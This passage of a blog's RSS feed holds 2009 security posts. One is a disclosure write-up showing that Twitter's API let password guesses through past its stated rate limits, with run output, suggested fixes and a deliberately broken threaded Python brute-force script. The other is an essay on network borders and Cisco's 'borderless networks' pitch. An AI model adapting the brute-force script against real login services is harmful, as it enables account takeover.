+but it looks from the outside like large providers have taken preventative steps to
+be prepared.&lt;/p&gt;
+
+&lt;p&gt;And if anyone else noticed Twitter seemed to have its own blackout, of Juniper personnel,
+as none of them have been tweeting a whole lot this week.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Breaking Twitter (Authenication)</title>
+      <link>https://jeremyrossi.com/blog/2009/08/25/breaking-twitter-authenication/</link>
+      <pubDate>Tue, 25 Aug 2009 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2009/08/25/breaking-twitter-authenication/</guid>
+      <description>
+
+&lt;p&gt;Yesterday we spent some time speculating on how phishing attacks like
+the one afflicting Twitter on Wednesday of this week are seeded. How are
+the original direct messages sent out that kick off the first stolen
+credentials, the next set of direct messages, and so on in the loop? We
+were hoping, but not counting on, the fact that Twitter might address
+this in their blog. Taking a page from Google or Microsoft, an up front
+and transparent approach to security seems to be the direction of
+major players in the online space. Twitter may consider embracing this
+approach, given its rampant rise in popularity and thus existence at the
+edge of malicious customized attacks from bad actors, as it likely has a
+lot of data that would benefit the information assurance community.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://praetorianprefect.com/archives/2009/09/rofl-this-you -on-here-the-latest-twitter-worm/&#34;&gt;In our rampant speculating&lt;/a&gt;
+(guessing), we noted that we thought
+brute force password attacks would move away from the main Twitter
+login page because of their implementation of CAPTCHA (showing an
+image that is easy for a human to translate and type in but difficult
+for a computer to identify), which occurs after several failed login
+attempts. While some success has been reported by both researchers
+attempting to break CAPTCHA, as well as researchers
+&lt;a href=&#34;http://securitylabs.websense.com/content/Blogs/2919.aspx&#34;&gt;watching others break it&lt;/a&gt;,
+the processing time of dealing with translating thousands of
+CAPTCHA messages becomes problematic from a password cracking
+standpoint (as far as we know, if you have a counter example
+please show us). So where does one go to perform the type of
+brute force password attack that a &lt;a href=&#34;http://www.wired.com/threatlevel/2009/01/professed-twitt/&#34;&gt;teenage hacker used in January&lt;/a&gt; to
+gain access to &lt;a href=&#34;http://twitter.com/crystal&#34;&gt;Crystal the Twitter admin&amp;rsquo;s&lt;/a&gt;
+account, achieve &amp;lsquo;Happiness&amp;rsquo; and allow others to tweet on behalf of
+Barack Obama and Britney Spears?&lt;/p&gt;
+
+&lt;div class=&#34;panel panel-default .col-md-6&#34; &gt;
+  &lt;div class=&#34;panel-body&#34;&gt;
+
+&lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/obama-twitter-hacked.jpg&#34;&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/obama-twitter-hacked.jpg&#34; alt=&#34;Back in January the @BarackObama account was broken into.&#34; title=&#34;obama-twitter-hacked&#34; width=&#34;500&#34; height=&#34;327&#34; class=&#34;size-full wp-image-576&#34; /&gt;&lt;/a&gt;
+
+&lt;br&gt;
+
+Back in January the @BarackObama account was broken into.
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We thought that the Twitter API (application program interface) is
+the next place to go. While moving towards OAuth authentication (a
+mechanism by which users can provide others access to their data
+without providing their authentication credentials) the old style
+API calls with user name and password are still available. Providing
+an API is one of the primary reasons for Twitter&amp;rsquo;s popularity, as
+many tools can provide both interfaces into the online services
+of Twitter, as well as act as aggregators for the data within
+Twitter&amp;rsquo;s data stores. In fact, for most tweeple, the actual system
+confines of Twitter might as well be a big database, as they are
+doing their tweeting through &lt;a href=&#34;http://tweetdeck.com/&#34;&gt;TweetDeck&lt;/a&gt; or
+&lt;a href=&#34;http://www.atebits.com/tweetie-iphone/&#34;&gt;Tweetie&lt;/a&gt;, monitoring topics
+at &lt;a href=&#34;http://twitterfall.com/&#34;&gt;TwitterFall&lt;/a&gt;, looking at their favorite
+famous twits at &lt;a href=&#34;http://www.congressional140.com&#34;&gt;Congressional140&lt;/a&gt;
+or &lt;a href=&#34;http://www.celebritytweet.com/&#34;&gt;CelebrityTweet&lt;/a&gt;, mapping the
+world&amp;rsquo;s tweets with &lt;a href=&#34;http://beta.twittervision.com/&#34;&gt;TwitterVision&lt;/a&gt;, or
+evaluating themselves with &lt;a href=&#34;http://www.cursebird.com/&#34;&gt;CurseBird&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;That same API provides an alternate path for logging into
+Twitter, and provides all the functionality available through
+the web application (authentication, reading tweets, tweeting).
+You can read more about the overall Twitter API here:
+&lt;a href=&#34;http://apiwiki.twitter.com&#34;&gt;http://apiwiki.twitter.com&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;But wait you say, are you trying to tell us that brute force password
+attacks will move to the API when I just read on the Twitter API wiki
+that the API severely limits the rate of calls you are allowed to make
+to it (200/hour/IP for authenticated requests without whitelisting)?
+That should be a mitigating control. Should be, but isn&amp;rsquo;t, because it is
+not enforced on all of the API calls.&lt;/p&gt;
+
+&lt;h3 id=&#34;rate-limit-we-don-t-need-no-stinking-rate-limit:fc3b26d4d48667693f82be9f46b9b4cc&#34;&gt;Rate Limit? We don&amp;rsquo;t need no stinking rate limit.&lt;/h3&gt;
+
+&lt;p&gt;From the twitter API documenation on
+&lt;a href=&#34;http://apiwiki.twitter.com/Twitter-REST-API-Method%3A-account%C2%A0verify_credentials&#34;&gt;account/verify_credentials&lt;/a&gt;
+Twitter states:&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Returns an HTTP 200 OK response code and a representation of the
+requesting user if authentication was successful; returns a 401 status
+code and an error message if not. Use this method to test if supplied
+user credentials are valid. Because this method can be a vector for a
+brute force dictionary attack to determine a user&amp;rsquo;s password, it is
+limited to &lt;em&gt;15 requests per 60 minute period&lt;/em&gt; (starting from your first
+request).&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, let&amp;rsquo;s see. Using a simple python program that tried known
+incorrect passwords as fast as the the API would respond (but well below
+DOS thresholds), we have this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;
+[~]% time python twitterauthcheck.py
+Login: _eeeeeeeek Password: 0 failed: HTTP Error 401: Unauthorized
+Login: _eeeeeeeek Password: 1 failed: HTTP Error 401: Unauthorized
+Login: _eeeeeeeek Password: 2 failed: HTTP Error 401: Unauthorized
+Login: _eeeeeeeek Password: 3 failed: HTTP Error 401: Unauthorized
+Login: _eeeeeeeek Password: 4 failed: HTTP Error 401: Unauthorized
+
+[......SNIP......]
+
+Login: _eeeeeeeek Password: 295 failed: HTTP Error 401: Unauthorized
+Login: _eeeeeeeek Password: 296 failed: HTTP Error 401: Unauthorized
+Login: _eeeeeeeek Password: 297 failed: HTTP Error 401: Unauthorized
+Login: _eeeeeeeek Password: 298 failed: HTTP Error 401: Unauthorized
+Login: _eeeeeeeek Password: 299 failed: HTTP Error 401: Unauthorized
+Login: _eeeeeeeek Password: &amp;lt;redacted&amp;gt; accepted
+/opt/local/bin/python2.6 testingauth.py  2.03s user 1.47s system 1% cpu 4:25.05 total
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So looking at the details we have 300 passwords attempted in 2 minutes
+and 3 seconds. We can also see on the 300th attempt the password was
+accepted (we put the correct password in at number 300) so we can
+conclude that the account is not getting locked out due to enforcement
+of rate limits. So next we ran the script six times concurrently (3,600
+attempts). Still not locked out.&lt;/p&gt;
+
+&lt;p&gt;We are also showing that we are able to blow through the overall 150
+request limit per IP per hour that Twitter reports is the rate limit.
+Running multiple attempts did start to hit some 503 Bad Gateway errors
+which we thought might be the end of the road, but no, it started
+responding again a second later.&lt;/p&gt;
+
+&lt;p&gt;Running the script is slow. Twitter&amp;rsquo;s greatest defense here against
+a true brute force attack using a single thread is that it takes a
+while for their infrastructure to respond. We can call that security
+through lack of capacity. Since a good password cracker takes more then
+a few hundred entries to work (&lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/dic.tx t&#34;&gt;this LOphtCrack dictionary has 235,007 entries.&lt;/a&gt;),
+we&amp;rsquo;ll go multi-threaded.&lt;/p&gt;
+
+&lt;p&gt;In a final controlled example, we use a known account where one person
+sets a dictionary word simple password and the other person runs the
+script without specifically knowing the password (just in case someone
+wants to write a Computer Fraud and Abuse Act essay in the comments,
+when someone logs into their own account its called authentication).
+Again, low request threshold, and only accessing our own account.&lt;/p&gt;
+
+&lt;p&gt;25,086 attempts thus far before we got bored watching it, so a little
+over 7 hours and the whole 200,000+ dictionary word list would be done,
+and likely any account using a common dictionary based password would
+be accessed. We tried a few subsequent runs that mixed in a correct
+password just to ensure everything was working, and the program notified
+us of the successful login.&lt;/p&gt;
+
+&lt;p&gt;If Twitter wants to minimize the probability of success for this
+vulnerability it could:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Enforce its stated rate limits.&lt;/li&gt;
+&lt;li&gt;Start requiring minimally complex passwords.&lt;/li&gt;
+&lt;li&gt;Complete the migration to OAuth.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As we like Twitter as much as the next, and because we are in favor of
+good faith disclosure, we have notified them of our concerns. &lt;em&gt;Update&lt;/em&gt;:
+A Twitter representative has responded that the information provided has
+been sent on to the right internal team at Twitter.&lt;/p&gt;
+
+&lt;p&gt;Here&amp;rsquo;s the Code: &lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/threadedtwitter.py.txt&#34; title=&#34;threadedtwitter.py&#34;&gt;threadedtwitter.py&lt;/a&gt;
+&lt;br&gt;
+Dictionary: &lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/09/dic.txt&#34; title=&#34;dic.txt&#34;&gt;dic.txt&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Please note, the code is provided for demonstration purposes only, should not be run ever, and contains intentional errors so that attempts to run it will not work.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The command is as follows: &lt;code&gt;twitterauthcheck.py username passwordlist.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import threading,Queue
+import socket
+import tweethon
+import urllib2
+import socket
+import sys
+
+class Threader:
+    # Class taken from: Sept 3 2004, Justin A: http://code.activestate.com/recipes/302746/
+    def __init__(self, numthreads):
+        self._numthreads=numthreads
+
+    def get_data(self,):
+        raise NotImplementedError, &amp;quot;You must implement get_data as a function that returns an iterable&amp;quot;
+        return range(10000)
+    def handle_data(self,data):
+        raise NotImplementedError, &amp;quot;You must implement handle_data as a function that returns anything&amp;quot;
+        time.sleep(random.randrange(1,5))
+        return data*data
+    def handle_result(self, data, result):
+        raise NotImplementedError, &amp;quot;You must implement handle_result as a function that does anything&amp;quot;
+        print data, result
+
+    def _handle_data(self):
+        while 1:
+            x=self.Q.get()
+            if x is None:
+                break
+            self.DQ.put((x,self.handle_data(x)))
+
+    def _handle_result(self):
+        while 1:
+            x,xa=self.DQ.get()
+            if x is None:
+                break
+            self.handle_result(x, xa)
+
+    def run(self):
+        if hasattr(self, &amp;quot;prerun&amp;quot;):
+            self.prerun()
+        self.Q=Queue.Queue()
+        self.DQ=Queue.Queue()
+        ts=[]
+        for x in range(self._numthreads):
+            t=threading.Thread(target=self._handle_data)
+            t.start()
+            ts.append(t)
+
+        at=threading.Thread(target=self._handle_result)
+        at.start()
+
+        try :
+            for x in self.get_data():
+                self.Q.put(x)
+        except NotImplementedError, e:
+            print e
+        for x in range(self._numthreads):
+            self.Q.put(None)
+        for t in ts:
+            t.join()
+        self.DQ.put((None,None))
+        at.join()
+        if hasattr(self, &amp;quot;postrun&amp;quot;):
+            return self.postrun()
+        return None
+
+
+class twitterpasswordtester(Threader):
+
+    def get_data(self):
+        data = open(sys.argv[2]).read()
+        data = data.split(&#39;\n&#39;)
+        self._usename = sys.argv[1]
+        self.counter = 0
+        return data
+
+    def handle_data(self,p):
+        print &amp;quot;in testAuth&amp;quot;
+        u = self._usename
+        x = tweethon.Api(username=u, password=p)
+        x.SetCache(None)
+        try:
+            x.VerifyCredentials()
+            results = &amp;quot;login: {0} Password: {1} accepted\n&amp;quot;.format(u, p)
+        except urllib2.HTTPError, e:
+            results = &amp;quot;login: {0} Password: {1} failed: {2}\n&amp;quot;.format(u, p, e)
+        finally:
+            del x
+            return results
+
+    def handle_result(self, data, result):
+        print result
+        print self.counter 
+        self.counter += 1
+        self.res.append((data,result))
+    def prerun(self):
+        self.res=[]
+    def postrun(self):
+        return self.res
+
+
+z = twitterpasswordtester(10)
+for n,ns in  a.run():
+    print n,ns
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Tweethon Source: &lt;a href=&#34;http://bitbucket.org/jrossi/tweethon/src/tip/README&#34;&gt;http://bitbucket.org/jrossi/tweethon/src/tip/README&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;The Tweethon library, the only custom or uncommon library above, is intended to make the &lt;a href=&#34;http://twitter.com/help/api&#34;&gt;Twitter web services API&lt;/a&gt; easier for python programmers to use.&lt;/em&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Are borderless networks possiable?</title>
+      <link>https://jeremyrossi.com/blog/2009/08/15/are-borderless-networks-possiable/</link>
+      <pubDate>Sat, 15 Aug 2009 00:00:00 +0000</pubDate>
+      
+      <guid>https://jeremyrossi.com/blog/2009/08/15/are-borderless-networks-possiable/</guid>
+      <description>
+
+&lt;p&gt;I attended &lt;a href=&#34;http://www.scmagazineus.com/SC-World-Congress-2009/section/886/&#34;&gt;SC World Congress&lt;/a&gt;
+in New York this week and a keynote from Cisco caught my attention: &lt;em&gt;Securing
+the Cloud: Building the Borderless Network&lt;/em&gt;.  I became fixated on the words
+used over and over by &lt;a href=&#34;http://www.scmagazineus.com/Joel-McFarland-senior-manager-Product-Management-Security-Technology-Group-Cisco-Systems/article/149536/&#34;&gt;Joel McFarland&lt;/a&gt;.
+Borderless this, borderless that, borderless everything.  This campaign started
+to bother me as this was a security conference and a network company was
+pushing the idea of less borders.  It seemed off, wrong, and incomplete to me.&lt;/p&gt;
+
+&lt;h2 id=&#34;little-bit-of-history:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Little Bit of History&lt;/h2&gt;
+
+&lt;p&gt;I am going to quickly cover some of the history of the Internet and how it
+grew borders, but please skip to the highlight of the article if you are
+familiar with this already: &lt;a href=&#34;#borderless-what&#34;&gt;Borderless Networks, What?&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;arpanet-69-91:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;ARPANET (&amp;lsquo;69-&amp;lsquo;91)&lt;/h4&gt;
+
+&lt;p&gt;In the beginning, there was &lt;a href=&#34;http://en.wikipedia.org/wiki/ARPANET&#34;&gt;ARPANET&lt;/a&gt;
+which was the pioneer in packet switching networks and gave providers the
+choice of which method and hardware for communication it would use.  However,
+the base protocol used for devices to communicate in ARPANET was NCP.&lt;br /&gt;
+The NCP  protocol could best be described as a network device driver and
+less as a network transport stack. It did not have any method for end-to-end
+error handling which was seen as a problem, but nothing was done about
+this until 1983.&lt;/p&gt;
+
+&lt;p&gt;In 1983, TCP/IP replaced NCP as the protocol for transport and ARPANET became
+a part of what was to become the Internet.  TCP/IP was a huge improvement
+over NCP in that it accounted for problems on the network and allowed the
+network not to come to a grinding halt when packets were lost.  It also
+achieved the concept of end-to-end connectivity between each host.  This
+meant that as long as two hosts were on the Internet they could reach
+each other by utilizing standard TCP/IP.  This standard framework also
+lead to the growth of many different applications as there was no longer
+any need to make changes to the network to add new applications/protocols.&lt;/p&gt;
+
+&lt;h4 id=&#34;first-borders-91-94:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;First Borders (&amp;lsquo;91-&amp;lsquo;94)&lt;/h4&gt;
+
+&lt;p&gt;All the building blocks were in place and  what formed was a large group
+of interconnected networks to share and exchange data. Then the first virus
+and worm hit in 1983 and 1988 respectively.  The
+&lt;a href=&#34;http://en.wikipedia.org/wiki/Morris_worm&#34;&gt;morris worm&lt;/a&gt; gained a fair amount
+of media attention and in fact prompted the establishment of &lt;a href=&#34;http://www.cert.org/&#34;&gt;CERT
+&lt;/a&gt;.  Even in this embryonic stage the vitality of the
+information being shared caused many researchers to begin placing limitations
+on the end-to-end connectivity of their hosts.  Thus began the &lt;em&gt;&amp;lsquo;Us&amp;rsquo;&lt;/em&gt;
+and &lt;em&gt;&amp;lsquo;Them&amp;rsquo;&lt;/em&gt; status of the Internet.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&amp;lsquo;Us&amp;rsquo;&lt;/em&gt; and &lt;em&gt;&amp;lsquo;Them&amp;rsquo;&lt;/em&gt; started out simple with a move to keep
+networks segregated-or put another way, adding a border
+between the networks. At first, the borders were nothing more
+than routers that limited the effects from network &lt;em&gt;A&lt;/em&gt; from
+spilling over into network &lt;em&gt;B&lt;/em&gt;. They were effective, but in 1991
+&lt;a href=&#34;http://en.wikipedia.org/wiki/Digital_Equipment_Corporation&#34;&gt;DEC&lt;/a&gt;
+released the first modern Firewall: SEAL. This marked the first real
+security border on the Internet, where all packets were inspected and
+compared to a set of policy rules before being passed on. These first
+security borders were instrumental in providing the trust and assurance
+in the network that companies and researchers required, speeding the
+growth of the Internet. While intrusion was still possible, the bar of
+entry was raised beyond causal attacks and probes.&lt;/p&gt;
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 42px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 1: Us vs. Them&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/static/img/us-them.png&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/statis/img/us-them.png&#34; border=&#34;1&#34; alt=&#34;Us vs Them&#34; width=&#34;300&#34; height=&#34;233&#34; /&gt; &lt;/a&gt;
+&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 1: Us vs. Them&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/static/img/us-them.png&#34;&gt;Figure 1: Us vs. Them&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;In 1992, the dominant addressing of hosts was IPv4, where each host is a
+assigned a 32-bit address.  This assignment limited the total number of
+addressable hosts to 4,294,967,296, but, due to reservations and subnetting,
+this could never be fully utilized.  At this time, it was recognized that
+IPv4 limitations would be become a problem in the future, beginning
+the process of creating a new IP protocol with a much higher number
+of addressable hosts. IPv6 was born in 1994, based on a 128-bit
+address for each host.  This would effectively allow every man,
+woman, and child on Earth to be assigned an address many times over.&lt;br /&gt;
+As a part of the formation of IPv6, security between networks was
+also taken into account and &lt;a href=&#34;http://en.wikipedia.org/wiki/IPsec&#34;&gt;IPSec&lt;/a&gt;
+was created as a requirement of the IPv6 protocol.&lt;/p&gt;
+
+&lt;p&gt;IPv6&amp;rsquo;s creation gave the Internet a secure method of communications
+between networks via IPSEC and nearly unlimited address space, but
+IPv6 did not get off the ground quickly.  This was mostly due to the
+fact that all devices and operating systems would need to be upgraded to
+handle the new protocol, and there was little to no pressure from the
+market to push things forward.   IPSec on the other hand did take off,
+as it quickly became the standard method for interconnecting trusted
+networks over an untrusted medium (such as the Internet).&lt;/p&gt;
+
+&lt;p&gt;At the same time that IPv6 and IPSec were being developed, another
+group of people began working on an alternate method for dealing
+with the lack of addressable space in IPv4.&lt;br /&gt;
+&lt;a href=&#34;http://en.wikipedia.org/wiki/Network_address_translation&#34;&gt;Network Address Translation (NAT)&lt;/a&gt;
+was published in &lt;a href=&#34;http://www.ietf.org/rfc/rfc1631.txt&#34;&gt;RFC1631&lt;/a&gt; in 1994
+as a short term solution, while the larger problems were being
+addressed.  NAT became very successful quickly as it allows a very
+large number of hosts to access the larger Internet while using very
+few publicly addressable IP addresses.  As with most things, NAT came
+with some trade-offs.  One of the big ones was that hosts no longer
+had complete end-to-end connectivity.  Thus, another border on the
+network was created; in practice firewalls became the dominate NAT
+devices.  Nonetheless, the NAT border would create problems for
+applications developers for years to come.&lt;/p&gt;
+
+&lt;h4 id=&#34;present-09:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Present (&amp;lsquo;09)&lt;/h4&gt;
+
+&lt;p&gt;In 2009, the way Internet runs is really not very different from
+1994;  IPv6 is just now getting underway, NAT is used everywhere,
+and IPSEC still secures networks over an untrusted medium. What
+has changed in a big way is the applications and uses of the Internet.&lt;br /&gt;
+Telephone calls commonly use the Internet for transport, on demand
+video is a huge source of traffic, social media networks garner huge
+numbers of users, online shopping is an important revenue stream for
+companies, and most recently more and more services are being
+hosted elastically on demand via the Internet.&lt;/p&gt;
+
+&lt;h2 id=&#34;borderless-what:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Borderless Networks. What?&lt;/h2&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s get back to Borderless Networks&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Cisco envisions a global network where you can go any place
+and access any data you could need at anytime.  John Chambers
+detailed the approach on a video at &lt;a href=&#34;http://cisco.com&#34;&gt;Cisco.com&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;In terms of what&amp;rsquo;s happening right now, I think the biggest market transition
+is the shift to a more collaborative world, which is only made possible by
+what we call an &amp;ldquo;intelligent, network-centric&amp;rdquo; world. This network-centric
+world encompasses the whole range of communication experiences and seamlessly
+delivers information. Consumers will access voice, the web, e-mail, and
+video by any of the 14 billion devices that we think will be connected to the
+internet by 2010, all loaded onto the network. In the very near future, for
+example, you won&amp;rsquo;t need to hang up your cell phone if you want to switch to
+a landline; you&amp;rsquo;ll stay connected as you change devices, as long as they&amp;rsquo;re
+all connected to a network.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.cisco.com/survey/exit.html?http://discussionleader.hbsp.com/hbreditors/2008/10/cisco_ceo_john_chambers_on_tea.html&#34;&gt;Cisco CEO John Chambers talks about Cisco&amp;rsquo;s collaborative management model&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Cisco also has a &lt;a href=&#34;http://www.cisco.com/web/solutions/netsys/g2/index.html?POSITION=social+media&amp;amp;COUNTRY_SITE=us&amp;amp;CAMPAIGN=Transformers+Launch&amp;amp;CREATIVE=Borderless+Networks+to+Index&amp;amp;REFERRING_SITE=Twitter&#34;&gt;Virtual event&lt;/a&gt;
+on Oct 20th for Borderless Networks, and have been encouraging people to
+register via &lt;a href=&#34;http://twitter.com/CiscoGeeks&#34;&gt;twitter&lt;/a&gt; and emails for the
+last two weeks.&lt;/p&gt;
+
+&lt;div class=&#34;panel panel-default&#34; style=&#34;float: right;width: 450px;text-align: left;margin: 5px;margin-left: 20px;&#34;&gt;
+  &lt;div class=&#34;panel-body&#34;&gt;
+
+&lt;h4&gt;LUNCH - Securing the cloud: Building the borderless network&lt;/h4&gt;
+
+An exploration into the “cloud” revealing the power of choice in email 
+security. Learn how to harness all the benefits that the cloud has to 
+offer while avoiding common pitfalls for early SaaS solutions. The 
+crumbling walls of network perimeters are forcing organizations to architect 
+new network designs to address the evolution of borderless networks. &lt;br&gt;
+&lt;br&gt;
+Attend this session and learn:&lt;br&gt;
+- Embracing the change to borderless networks&lt;br&gt;
+- Understanding Cisco&#39;s next-generation cloud security architecture&lt;br&gt;
+- Realizing the power of choice in choosing an email security solution&lt;br&gt;
+&lt;br&gt;
+- Joel McFarland, senior manager in the product management team within the Security Technology Group at Cisco Systems&lt;br&gt;
+
+&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a href=&#34;http://www.scmagazineus.com/Agenda-Day-1-2009/section/888/&#34;&gt;SC World Congress: Agenda Day 1&lt;/a&gt;&lt;/P&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I first learned of the Borderless Networks push during the
+&lt;a href=&#34;http://www.scmagazineus.com/SC-World-Congress-2009/section/886/&#34;&gt;SC World Congress&lt;/a&gt;.  I
+was there to get a preview of Borderless Networks as presented by Joel
+McFarland.  The session description sounded interesting and as it was a
+keynote there was nothing else to pull on my time.&lt;/p&gt;
+
+&lt;p&gt;Two co-workers and I attended the session, but being a little late we had to
+make our way to the very front of the room to find seats.  Up front we were able
+to hear and see everything in great detail, but in hindsight this might have
+not been the best place for us. There was no way Joel could have missed the
+looks of skepticism on all three of our faces.&lt;/p&gt;
+
+&lt;p&gt;Joel pushed the Cisco idea of Borderless Networks in many different ways, but
+pointed to the &lt;a title=&#34;Figure 2: The iPhone&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;iPhone&lt;/a&gt;
+as the game changer, the beginning of things to come.  Then iPhone and
+salesforce.com became his prime example of how the mobile sales team are
+almost completely disconnected from the enterprise network.  They access
+leads, manage contacts, input orders, and exchange notes and information all
+without even logging into the corporate network.  At this point, I looked to
+my co-workers with a questioning expression and whispered the rhetorical
+question &amp;ldquo;&lt;em&gt;No corporate login?&lt;/em&gt;&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;The example Joel used is common for a sales workforce, and is actively
+encouraged in many environments, but this was just something that I have
+always felt was wrong.  In many companies, sales leads are valuable
+information and something that competitors and even other sales people
+would actively try to gain access to.  When all access to this information
+is controlled by an external party you are no longer able to apply your own
+controls. In fact, you are beholden to the policies and procedures of the
+provider.  Joel was one step ahead of me on this.  He pointed out the
+problems that were playing through my head and countered that salesforce.com
+can be made to use a corporation&amp;rsquo;s internal authentication methods (Active
+Directory, RSA Token, etc.).  As such, your internal policies for access
+and removal of access are once again in your control.  I conceded. Joel
+is correct that salesforce.com can be brought into line with one&amp;rsquo;s internal
+security policy, but he does not address the issue of the remote device-the
+iPhone itself.&lt;/p&gt;
+
+&lt;h4 id=&#34;borderless:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Borderless&lt;/h4&gt;
+
+&lt;p&gt;Let me come back to the iPhone in a bit, I want to point out another slide
+that came up during this iPhone praise.  In
+&lt;a title=&#34;Figure 2: Before &amp; After&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;Figure 2&lt;/a&gt;
+I have created a combined version of the two slides Joel was showing to
+demonstrate the future of networking (I have recreated them from memory,
+but its close enough for this post).&lt;/p&gt;
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 42px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 2: Before &amp; After&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/before-after_borderless.png&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/before-after_borderless.png&#34; border=&#34;1&#34; alt=&#34;Us vs Them&#34; width=&#34;500&#34; height=&#34;400&#34; /&gt; &lt;/a&gt;
+&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 2: Before &amp; After&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/before-after_borderless.png&#34;&gt;Figure 2: Before &amp; After&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;In Figure 2, we have the &lt;strong&gt;before&lt;/strong&gt; and &lt;strong&gt;after&lt;/strong&gt; sections.  According to
+Joel, currently the &lt;strong&gt;before&lt;/strong&gt; example is a good summary of how most enterprises
+networks allow access into and between their networks.  This Joel and I agree on.&lt;/p&gt;
+
+&lt;p&gt;As seen in the &lt;strong&gt;before&lt;/strong&gt; section, you have a defined entry point into the network
+from outside, where all external resources gain access.  This is your border between
+&amp;ldquo;&lt;em&gt;us&lt;/em&gt;&amp;rdquo; and &amp;ldquo;&lt;em&gt;them&lt;/em&gt;&amp;rdquo;.  In the examples, both the remote home desktop and iPhone
+access the network and are allowed across past the border only if proper authentication
+and authorization have take place.  Once completed, the remote device is granted
+access to the resources that are allowed for it to function as an effective job
+tool: access to to internet via internal proxy, access of files in the London
+office, or logging into the salesforce.com website.  The key thing is that all
+access flows through this single point of entry.&lt;/p&gt;
+
+&lt;p&gt;By restricting access for remote devices to a single point, we are able
+to overcome some technical shortcomings and greatly reduce the vectors
+of attack for the network. NAT is required due to the limited number
+of publicly addressable addresses. Thus end-to-end connectivity is not
+an option for the remote devices. The use of IPSec for transport and
+assigning a RFC1918 address to the remote device end of the IPSec tunnel
+allows one to overcome the NAT limitations. This gives you remote device
+end-to-end connectivity within the enterprise network. By using this
+method the network administrators are able to capture and monitor at a
+single point all access into and out of the network. NAC, IPS/IDS, and
+other methods of monitoring are commonly deployed here.&lt;/p&gt;
+
+&lt;p&gt;With the &lt;strong&gt;after&lt;/strong&gt; diagram of Figure 2, we see the future as Cisco/Joel
+see it. This is where all resources are able to access all other
+resources; also known as complete end-to-end connectivity. Joel did not
+say how this was to be achieved, but given the network diagram it&amp;rsquo;s not
+hard to surmise that Cisco is planning a big push for IPv6. IPv6 will
+allow for this type of network, and will bring down the NAT boundary.
+With it the technical limitation of too few addresses for end-to-end
+connectivity on the Internet is eliminated and things can get a lot more
+complex as we see in the &lt;strong&gt;after&lt;/strong&gt; section of the diagram.&lt;/p&gt;
+
+&lt;p&gt;On the &lt;strong&gt;after&lt;/strong&gt; diagram you see end-to-end connectivity to each
+resource both inside the network and outside. We have an iPhone going
+directly to salesforce.com, directly accessing a file in the London
+office, and able to access all the data that it could ever need. What
+about limiting access to resources? How do you make sure that a remote
+home desktop does not start copying all of the data from the London
+office, NYC office, and salesforce.com to a remote site? What if the
+desktop is infected with malware? How do you log the activity of the
+remote device access? All the questions become much harder when you have
+completed end-to-end connectivity, and historically we have learned it
+becomes an even larger problem when there are remote devices involved.&lt;/p&gt;
+
+&lt;p&gt;All the questions I have asked about the security of the &lt;strong&gt;after&lt;/strong&gt;
+sections can be answered with products already on the market and in
